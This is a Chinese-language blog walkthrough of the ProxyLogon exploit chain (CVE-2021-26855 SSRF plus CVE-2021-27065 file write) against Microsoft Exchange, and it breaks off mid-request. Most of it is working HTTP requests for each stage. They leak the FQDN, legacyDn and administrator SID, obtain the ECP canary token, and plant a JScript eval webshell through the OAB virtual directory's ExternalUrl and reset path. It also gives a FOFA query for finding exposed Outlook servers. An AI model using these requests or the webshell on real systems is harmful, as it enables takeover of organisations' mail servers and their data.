<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>Exchange Server 2019<br>Exchange Server 2016<br>Exchange Server 2013<br>Exchange Server 2010</p>
<h3 id="FOFA-title-”Outlook-Web-App”-title-”Outlook”"><a href="#FOFA-title-”Outlook-Web-App”-title-”Outlook”" class="headerlink" title="FOFA   title:”Outlook Web App”   title:”Outlook”"></a>FOFA   title:”Outlook Web App”   title:”Outlook”</h3><h3 id="CVE-2021–26855-无条件SSRF-、CVE-2021-27065-有条件写文件漏洞"><a href="#CVE-2021–26855-无条件SSRF-、CVE-2021-27065-有条件写文件漏洞" class="headerlink" title="CVE-2021–26855 无条件SSRF 、CVE-2021-27065 有条件写文件漏洞"></a>CVE-2021–26855 无条件SSRF 、CVE-2021-27065 有条件写文件漏洞</h3><p>CVE-2021–26855是一个SSRF漏洞，问题出现在将客户端请求代理到服务端时，该漏洞可以获取用户的sid，实现了无交互攻击链中最重要的第一步</p>
<p>CVE-2021-27065 则是一个写文件漏洞，虽然不能完全控制要写入的内容，但是文件名与路径可以任意设置。当我们以 .aspx 为后缀创建文件，并在文件中插入一句话木马时，可以实现远程控制。</p>
<p>对aspx也不太熟悉，而且这两个漏洞国内外都有分析文章了，参考一下大佬们的文章。</p>
<h4 id="SSRF触发POC"><a href="#SSRF触发POC" class="headerlink" title="SSRF触发POC"></a>SSRF触发POC</h4><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">GET</span> /owa/auth/to<span class="number">6</span>.js HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="number">192.168.80.145</span></span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">10</span>.<span class="number">0</span>; Win<span class="number">64</span>; x<span class="number">64</span>) AppleWebKit/<span class="number">537</span>.<span class="number">36</span> (KHTML, like Gecko) Chrome/<span class="number">88</span>.<span class="number">0</span>.<span class="number">4324</span>.<span class="number">190</span> Safari/<span class="number">537</span>.<span class="number">36</span></span><br><span class="line"><span class="attribute">Cookie</span>: X-BEResource=WIN-VPP<span class="number">0</span>SKBO<span class="number">8</span>PV/owa/auth/logon.aspx?a=~<span class="number">1942062522</span>;</span><br><span class="line"></span><br><span class="line"><span class="attribute">Cookie</span> 替换成 </span><br><span class="line"><span class="attribute">X</span>-AnonResource=true; X-AnonResource-Backend=ssrf.<span class="number">0</span>t<span class="number">9</span>gi<span class="number">7</span>.dnslog.cn?~<span class="number">1</span>; X-BEResource=localhost/owa/auth/logon.aspx?a=~<span class="number">1942062522</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-31/1615730102304.png"></p>
<h4 id="写文件漏洞POC"><a href="#写文件漏洞POC" class="headerlink" title="写文件漏洞POC"></a>写文件漏洞POC</h4><p>在ecp 管理界面找到 关于虚拟目录的配置窗口:</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-31/1615730955377.png"></p>
<p>可以看到，在OAB VirtualDirectory 的配置界面有多个字段可以配置，我么将其中的ExternUrl 中设置为一句话木马。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ecp/DDI/DDIService.svc/SetObject?ActivityCorrelationID=6a514deb-63f6-de66-bd6f-1bdb1372c5e9&amp;schema=OABVirtualDirectory&amp;msExchEcpCanary=ZhBC9peaokSmI2OyOcFVB3CGG7Xx5tgI_4Pj1aULHX8eKw3vepYhFotg8qQGvPc_71l3YQkKt0c.</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.80.145</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>391</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://192.168.80.145</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=UTF-8</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://192.168.80.145/ecp/VDirMgmt/EditOABVDir.aspx?pwmcid=10&amp;ReturnObjectType=1&amp;id=599c27e3-3273-41a7-ad77-028a7a78d4ca</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span></span><br><span class="line"></span><br><span class="line">&#123;&quot;identity&quot;:&#123;&quot;__type&quot;:&quot;Identity:ECP&quot;,&quot;DisplayName&quot;:&quot;OAB (Default Web Site)&quot;,&quot;RawIdentity&quot;:&quot;599c27e3-3273-41a7-ad77-028a7a78d4ca&quot;&#125;,&quot;properties&quot;:&#123;&quot;Parameters&quot;:&#123;&quot;__type&quot;:&quot;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&quot;,&quot;ExternalUrl&quot;:&quot;http://ffff/#&lt;script language=\&quot;JScript\&quot; runat=\&quot;server\&quot;&gt; function Page_Load()&#123;/**/eval(Request[\&quot;exec_code\&quot;],\&quot;unsafe\&quot;);&#125;&lt;/script&gt;&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-31/1615731186832.png"></p>
<p>这里面比较重要的两个参数 <code>ActivityCorrelationID</code> 、<code>msExchEcpCanary</code></p>
<p>而后选择重置 虚拟目录：</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-31/1615731520724.png"></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-31/1615731707663.png"></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ecp/DDI/DDIService.svc/SetObject?ActivityCorrelationID=928328a0-0785-245f-f995-c95e2e086fdf&amp;schema=ResetOABVirtualDirectory&amp;msExchEcpCanary=ZhBC9peaokSmI2OyOcFVB3CGG7Xx5tgI_4Pj1aULHX8eKw3vepYhFotg8qQGvPc_71l3YQkKt0c.</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.80.145</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>311</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://192.168.80.145</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=UTF-8</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://192.168.80.145/ecp/VDirMgmt/ResetVirtualDirectory.aspx?pwmcid=14&amp;ReturnObjectType=1&amp;id=599c27e3-3273-41a7-ad77-028a7a78d4ca&amp;schema=ResetOABVirtualDirectory</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>msExchEcpCanary=ZhBC9peaokSmI2OyOcFVB3CGG7Xx5tgI_4Pj1aULHX8eKw3vepYhFotg8qQGvPc_71l3YQkKt0c.;</span><br><span class="line"></span><br><span class="line">&#123;&quot;identity&quot;:&#123;&quot;__type&quot;:&quot;Identity:ECP&quot;,&quot;DisplayName&quot;:&quot;OAB (Default Web Site)&quot;,&quot;RawIdentity&quot;:&quot;599c27e3-3273-41a7-ad77-028a7a78d4ca&quot;&#125;,&quot;properties&quot;:&#123;&quot;Parameters&quot;:&#123;&quot;__type&quot;:&quot;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&quot;,&quot;FilePathName&quot;:&quot;\\\\127.0.0.1\\c$\\Program Files\\Microsoft\\test.aspx&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-31/1615736807954.png"></p>
<p>这两步操作都是需要高权限，所有可以结合SSRF进行文件写入操作RCE</p>
<!-- moro -->

<h2 id="目前-2021-03-13-公开EXP的分析"><a href="#目前-2021-03-13-公开EXP的分析" class="headerlink" title="目前(2021-03-13) 公开EXP的分析"></a>目前(2021-03-13) 公开EXP的分析</h2><p>大部分都源自 testanull 的exp改编恶搞的</p>
<p>（ps：在同事那边弹出的是个动画…）</p>
<p>部分脚本执行后直接弹出浏览器的，侮辱性极强</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-31/1615726017051.png"></p>
<h3 id="分析poc"><a href="#分析poc" class="headerlink" title="分析poc"></a>分析poc</h3><p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-31/1615726115838.png"></p>
<p>在25和35行左右，发现这段视频链接是被hex编码了，这里只是输出了一下</p>
<p>删除即可！</p>
<h4 id="exp执行流程"><a href="#exp执行流程" class="headerlink" title="exp执行流程"></a>exp执行流程</h4><p>主要是两大流程</p>
<ul>
<li>获取高权限邮箱账号</li>
<li>SSRF+文件写入</li>
</ul>
<p>根据大佬这篇文章可以了解到大致的攻击链</p>
<p><a href="https://testbnull.medium.com/ph%C3%A2n-t%C3%ADch-l%E1%BB%97-h%E1%BB%95ng-proxylogon-mail-exchange-rce-s%E1%BB%B1-k%E1%BA%BFt-h%E1%BB%A3p-ho%C3%A0n-h%E1%BA%A3o-cve-2021-26855-37f4b6e06265">https://testbnull.medium.com/ph%C3%A2n-t%C3%ADch-l%E1%BB%97-h%E1%BB%95ng-proxylogon-mail-exchange-rce-s%E1%BB%B1-k%E1%BA%BFt-h%E1%BB%A3p-ho%C3%A0n-h%E1%BA%A3o-cve-2021-26855-37f4b6e06265</a></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-31/1_8Jy_Puh_FabMu7_HG0h1nQ.png"></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-31/1_abW04G4GR9lcTZ0uJVHR5A.png"></p>
<h5 id="第一阶段-获取-FQDN"><a href="#第一阶段-获取-FQDN" class="headerlink" title="第一阶段** 获取 FQDN"></a>第一阶段** 获取 FQDN</h5><p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-31/1615726350919.png"></p>
<p>先是请求了  <code>https://192.168.80.145/ecp/to6.js</code></p>
<p>Cookie为</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">Cookie: <span class="attribute">X-BEResource</span>=localhost~1942062522</span><br></pre></td></tr></table></figure>

<p>文件名采用随机字符，以js为后缀</p>
<p>从大佬的分析文章中得出 <a href="https://paper.seebug.org/1501/">https://paper.seebug.org/1501/</a> </p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-31/ebc50326df8d269b18f4e49ecb77b126.png"></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-31/9a4de8545fdb8d29c2863031e575d3a0.png"></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-31/278c659211532f69164ec11ecc191b43.png"></p>
<p>判断要素有两个，Cookies 中要有 X-BEResource 字段，且请求路径需要以 .axc 或 .css 或 .js 或 其他一些后缀进行结尾。只有这两个条件满足，才会选择 BEResourceRequestHandler 作为请求 Handler。</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-31/a1ca1d56901fdabf2f13f16da917b857.png"></p>
<p>可以看到，该函数直接提取出Cookie 中的 X-BEResource 字段，并用其生成 BackEndServe实例。查看 BackEndServer.FromString() 函数，会发现它直接 依据 ‘~’ 符号切割 beresourceCookie 字符串，前半段作为 FQDN，后半段作为 version。所谓 fqdn 既是 “全限定域名” 。这个version 指的是 BackEndServer Version。</p>
<p>所有这个请求可以从返回头 <code>X-FEServer</code> 获取到 <code>FQDN</code>，这个参数后面的过程都会用到。</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-31/1615726521130.png"></p>
<h5 id="第二阶段-获取-legacyDn"><a href="#第二阶段-获取-legacyDn" class="headerlink" title="第二阶段  获取 legacyDn"></a><strong>第二阶段</strong>  获取 legacyDn</h5><p>带入之前获取到的 <code>FQDN</code> 通过SSRF访问内部的 <code>autodiscover/autodiscover.xml</code> 来获取邮箱用户对应的 <code>legacyDn</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">POST /ecp/iw6.js</span><br><span class="line">Cookie: X-BEResource=WIN-VPP0SKBO8PV/autodiscover/autodiscover.xml?a=~1942062522;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">Autodiscover</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Request</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">EMailAddress</span>&gt;</span>administrator@target.com<span class="tag">&lt;/<span class="name">EMailAddress</span>&gt;</span> <span class="tag">&lt;<span class="name">AcceptableResponseSchema</span>&gt;</span>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a<span class="tag">&lt;/<span class="name">AcceptableResponseSchema</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Request</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Autodiscover</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-31/1615732450796.png"></p>
<h5 id="第三阶段-获取-SID"><a href="#第三阶段-获取-SID" class="headerlink" title="第三阶段 获取 SID"></a><strong>第三阶段</strong> 获取 SID</h5><p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-31/1615732517829.png"></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-31/1615732635763.png"></p>
<p>根据大佬文章所写，通过带入构造好的 <code>legacyDn</code> 来请求 <code>/mapi/emsmdb</code> 接口，使其报错会返回用户完整的 <code>SID</code></p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">mapi_body = legacyDn + &quot;<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>e4<span class="symbol">\x</span>04<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>09<span class="symbol">\x</span>04<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>09<span class="symbol">\x</span>04<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00&quot;</span><br></pre></td></tr></table></figure>

<p>但这里始终无法生效 （公开EXP几乎都停留在这个阶段）</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-31/1615732850147.png"></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-31/1615732830818.png"></p>
<p>再仔细看大佬的文章，发现Cookie中少了字段</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-31/1615732979501.png"></p>
<p>添加请求头</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">X</span>-Requesttype: Connect</span><br><span class="line"><span class="attribute">X</span>-Clientinfo: &#123;<span class="number">2</span>F<span class="number">94</span>A<span class="number">2</span>BF-A<span class="number">2</span>E<span class="number">6</span>-<span class="number">4</span>CCCC-BF<span class="number">98</span>-B<span class="number">5</span>F<span class="number">22</span>C<span class="number">542226</span>&#125;</span><br><span class="line"><span class="attribute">X</span>-Clientapplication: Outlook/<span class="number">15</span>.<span class="number">0</span>.<span class="number">4815</span>.<span class="number">1002</span></span><br><span class="line"><span class="attribute">X</span>-Requestid: &#123;C<span class="number">715155</span>F-<span class="number">2</span>BE<span class="number">8</span>-<span class="number">44</span>E<span class="number">0</span>-BD<span class="number">34</span>-<span class="number">2960067874</span>C<span class="number">8</span>&#125;:<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>成功返回错误信息，并且包含 <code>SID</code></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-31/1615733738757.png"></p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">POST <span class="regexp">/ecp/</span>wg6.js</span><br><span class="line">X-Requestid: &#123;C715155F-<span class="number">2</span>BE8-<span class="number">44</span>E0-BD34-<span class="number">2960067874</span>C8&#125;:<span class="number">2</span></span><br><span class="line">X-Requesttype: Connect</span><br><span class="line">X-Clientapplication: Outlook/<span class="number">15.0</span>.<span class="number">4815.1002</span></span><br><span class="line">X-Clientinfo: &#123;<span class="number">2</span>F94A2BF-A2E6-<span class="number">4</span>CCCC-BF98-B5F22C542226&#125;</span><br><span class="line">Cookie: X-BEResource=Admin@WIN-VPP0SKBO8PV:<span class="number">444</span><span class="regexp">/mapi/</span>emsmdb?MailboxId=f26bc937-b7b3-<span class="number">4402</span>-b890-<span class="number">96</span>c46713e5d5@exchange.lab&amp;a=~<span class="number">1942062522</span>;</span><br><span class="line"></span><br><span class="line"><span class="regexp">/o=First Organization/</span>ou=Exchange Administrative <span class="keyword">Group</span> (FYDIBOHF23SPDLT)<span class="regexp">/cn=Recipients/</span>cn=c55609b41e564fea9a03638572f60cac-Admin</span><br></pre></td></tr></table></figure>



<h5 id="第四阶段-通过-proxyLogon-链获取-ASP-NET-SessionId-和-msExchEcpCanary"><a href="#第四阶段-通过-proxyLogon-链获取-ASP-NET-SessionId-和-msExchEcpCanary" class="headerlink" title="第四阶段 通过 proxyLogon 链获取 ASP.NET_SessionId 和 msExchEcpCanary"></a><strong>第四阶段</strong> 通过 <code>proxyLogon</code> 链获取 ASP.NET_SessionId 和 msExchEcpCanary</h5><p>这里有一个坑，怎么样再返回头里都获取不到 <code>msExchEcpCanary</code></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-31/1615733897628.png"></p>
<p>最后在文章的一张图片中找到，可能需要请求头中的 <code>msExchLogonMailbox</code> </p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-31/1615737607725.png"></p>
<p>做了打码处理，问题应该就在请求头上了</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-31/1615734555443.png"></p>
<p>经过测试 <code>msExchLogonMailbox</code> ，而内容，猜测为<code>SID</code>，添加到请求头中成功获取 <code>msExchEcpCanary</code></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-31/1615734701036.png"></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">POST</span> /ecp/wg<span class="number">6</span>.js</span><br><span class="line"><span class="attribute">Cookie</span>: X-BEResource=Admin@WIN-VPP<span class="number">0</span>SKBO<span class="number">8</span>PV:<span class="number">444</span>/ecp/proxyLogon.ecp?a=~<span class="number">1942062522</span>;</span><br><span class="line"><span class="attribute">msExchLogonMailbox</span>: S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">235536837</span>-<span class="number">3153707863</span>-<span class="number">4205355218</span>-<span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="section">&lt;r at=<span class="string">&quot;Negotiate&quot;</span> ln=<span class="string">&quot;john&quot;</span>&gt;</span><span class="section">&lt;s&gt;</span><span class="attribute">S</span>-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">235536837</span>-<span class="number">3153707863</span>-<span class="number">4205355218</span>-<span class="number">500</span>&lt;/s&gt;&lt;s a=<span class="string">&quot;7&quot;</span> t=<span class="string">&quot;1&quot;</span>&gt;S-<span class="number">1</span>-<span class="number">1</span>-<span class="number">0</span>&lt;/s&gt;&lt;s a=<span class="string">&quot;7&quot;</span> t=<span class="string">&quot;1&quot;</span>&gt;S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">2</span>&lt;/s&gt;&lt;s a=<span class="string">&quot;7&quot;</span> t=<span class="string">&quot;1&quot;</span>&gt;S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">11</span>&lt;/s&gt;&lt;s a=<span class="string">&quot;7&quot;</span> t=<span class="string">&quot;1&quot;</span>&gt;S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">15</span>&lt;/s&gt;&lt;s a=<span class="string">&quot;3221225479&quot;</span> t=<span class="string">&quot;1&quot;</span>&gt;S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">5</span>-<span class="number">0</span>-<span class="number">6948923</span>&lt;/s&gt;&lt;/r&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="第五阶段-SSRF-文件写入"><a href="#第五阶段-SSRF-文件写入" class="headerlink" title="第五阶段 SSRF+文件写入"></a><strong>第五阶段</strong> SSRF+文件写入</h5><p>分为三个部分</p>
<p>通过之前获取到的所有重要的参数</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">FQDN</span><br><span class="line">msExchEcpCanary</span><br><span class="line">ASP.NET_SessionId</span><br><span class="line">msExchLogonMailbox</span><br></pre></td></tr></table></figure>

<h6 id="1-获取虚拟目录的配置的OBA-id"><a href="#1-获取虚拟目录的配置的OBA-id" class="headerlink" title="(1) 获取虚拟目录的配置的OBA_id"></a>(1) 获取虚拟目录的配置的<code>OBA_id</code></h6><p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-31/1615735352761.png"></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-31/1615735565711.png"></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-31/1615735588391.png"></p>
<p>从请求包中看一切正常，尝试多次后在请求加入 <code>msExchLogonMailbox</code> 才能获取到<code>oab_id</code></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-31/1615735758947.png"></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">POST <span class="regexp">/ecp/i</span>5b.js</span><br><span class="line">Cookie: X-BEResource=Admin@WIN-VPP0SKBO8PV:<span class="number">444</span><span class="regexp">/ecp/</span>DDI<span class="regexp">/DDIService.svc/</span>GetObject?schema=OABVirtualDirectory&amp;msExchEcpCanary=<span class="number">6</span>OG494zsXUmp4LlyWVOnnN8AkMmP6NgIkcu_kPxwYLT1mreKGgtwauQi0X4xWMtXEdVMMTQ3Z3Y.&amp;a=~<span class="number">1942062522</span>; ASP.NET_SessionId=<span class="number">5</span>cc5a468-<span class="number">145</span>a-<span class="number">469</span>c-b5da-<span class="number">3</span>d6d38d70d03; msExchEcpCanary=<span class="number">6</span>OG494zsXUmp4LlyWVOnnN8AkMmP6NgIkcu_kPxwYLT1mreKGgtwauQi0X4xWMtXEdVMMTQ3Z3Y.</span><br><span class="line">msExchLogonMailbox: S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;filter&quot;</span>: &#123;<span class="string">&quot;Parameters&quot;</span>: &#123;<span class="string">&quot;SelectedView&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;SelectedVDirType&quot;</span>: <span class="string">&quot;All&quot;</span>, <span class="string">&quot;__type&quot;</span>: <span class="string">&quot;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&quot;</span>&#125;&#125;, <span class="string">&quot;sort&quot;</span>: &#123;&#125;&#125;</span><br></pre></td></tr></table></figure>



<h6 id="2-修改虚拟目录的配置"><a href="#2-修改虚拟目录的配置" class="headerlink" title="(2) 修改虚拟目录的配置"></a>(2) 修改虚拟目录的配置</h6><p>在json中的 <code>ExternalUrl</code> 参数修改为一句话</p>
<figure class="highlight erlang-repl"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;ExternalUrl&quot;</span>: <span class="string">&quot;http://ffff/#%s&quot;</span> <span class="comment">% shell_content</span></span><br></pre></td></tr></table></figure>

<p>同样需要带入 <code>msExchLogonMailbox</code> 头进行请求</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-31/1615736022888.png"></p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="type">POST</span> <span class="operator">/</span>ecp<span class="operator">/</span>56o.js</span><br><span class="line"><span class="type">Cookie</span>: <span class="type">X</span><span class="operator">-</span><span class="type">BEResource</span><span class="operator">=</span><span class="type">Admin</span><span class="meta">@WIN</span><span class="operator">-</span><span class="type">VPP0SKBO8PV</span>:<span class="number">444</span><span class="operator">/</span>ecp<span class="operator">/</span><span class="type">DDI</span><span class="operator">/</span><span class="type">DDIService</span>.svc<span class="operator">/</span><span class="type">SetObject</span>?schema<span class="operator">=</span><span class="type">OABVirtualDirectory</span><span class="operator">&amp;</span>msExchEcpCanary<span class="operator">=</span>67CGESO5CEODgNVWzzzHBehkzMiQ6NgI9wIOjtzXKv7c6gbNvZ<span class="operator">-</span>vErErAzvYBolDMKT9OZx3IR4<span class="operator">.&amp;</span>a<span class="operator">=~</span><span class="number">1942062522</span>; <span class="type">ASP</span>.<span class="type">NET_SessionId</span><span class="operator">=</span>09dfa549<span class="operator">-</span><span class="number">1787</span><span class="operator">-</span><span class="number">4812</span><span class="operator">-</span>be5b<span class="operator">-</span>4daa4fbe181d; msExchEcpCanary<span class="operator">=</span>67CGESO5CEODgNVWzzzHBehkzMiQ6NgI9wIOjtzXKv7c6gbNvZ<span class="operator">-</span>vErErAzvYBolDMKT9OZx3IR4.</span><br><span class="line">msExchLogonMailbox: <span class="type">S</span><span class="operator">-</span><span class="number">1</span><span class="operator">-</span><span class="number">5</span><span class="operator">-</span><span class="number">21</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;properties&quot;</span>: &#123;<span class="string">&quot;Parameters&quot;</span>: &#123;<span class="string">&quot;ExternalUrl&quot;</span>: <span class="string">&quot;http://ffff/#&lt;script language=<span class="subst">\&quot;</span>JScript<span class="subst">\&quot;</span> runat=<span class="subst">\&quot;</span>server<span class="subst">\&quot;</span>&gt; function Page_Load()&#123;/**/eval(Request[<span class="subst">\&quot;</span>exec_code<span class="subst">\&quot;</span>],<span class="subst">\&quot;</span>unsafe<span class="subst">\&quot;</span>);&#125;&lt;/script&gt;&quot;</span>, <span class="string">&quot;__type&quot;</span>: <span class="string">&quot;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&quot;</span>&#125;&#125;, <span class="string">&quot;identity&quot;</span>: &#123;<span class="string">&quot;DisplayName&quot;</span>: <span class="string">&quot;OAB (Default Web Site)&quot;</span>, <span class="string">&quot;__type&quot;</span>: <span class="string">&quot;Identity:ECP&quot;</span>, <span class="string">&quot;RawIdentity&quot;</span>: <span class="string">&quot;1dfca183-5e18-4453-b8a2-291138404cf0&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<h6 id="3-重置虚拟目录"><a href="#3-重置虚拟目录" class="headerlink" title="(3) 重置虚拟目录"></a>(3) 重置虚拟目录</h6><p>这一步可以设置自定义写入一句话的路径</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-31/1615736173642.png"></p>
<p>在 <code>FilePathName</code> 参数设置shell路径</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">shell_path = <span class="string">&quot;Program Files<span class="subst">\\</span>Microsoft<span class="subst">\\</span>Exchange Server<span class="subst">\\</span>V15<span class="subst">\\</span>FrontEnd<span class="subst">\\</span>HttpProxy<span class="subst">\\</span>owa<span class="subst">\\</span>auth<span class="subst">\\</span>ahihi.aspx&quot;</span></span><br></pre></td></tr></table></figure>

<p>请求头同样需要 <code>msExchLogonMailbox</code></p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="type">POST</span> <span class="operator">/</span>ecp<span class="operator">/</span>56o.js</span><br><span class="line"><span class="type">Cookie</span>: <span class="type">X</span><span class="operator">-</span><span class="type">BEResource</span><span class="operator">=</span><span class="type">Admin</span><span class="meta">@WIN</span><span class="operator">-</span><span class="type">VPP0SKBO8PV</span>:<span class="number">444</span><span class="operator">/</span>ecp<span class="operator">/</span><span class="type">DDI</span><span class="operator">/</span><span class="type">DDIService</span>.svc<span class="operator">/</span><span class="type">SetObject</span>?schema<span class="operator">=</span><span class="type">ResetOABVirtualDirectory</span><span class="operator">&amp;</span>msExchEcpCanary<span class="operator">=</span>67CGESO5CEODgNVWzzzHBehkzMiQ6NgI9wIOjtzXKv7c6gbNvZ<span 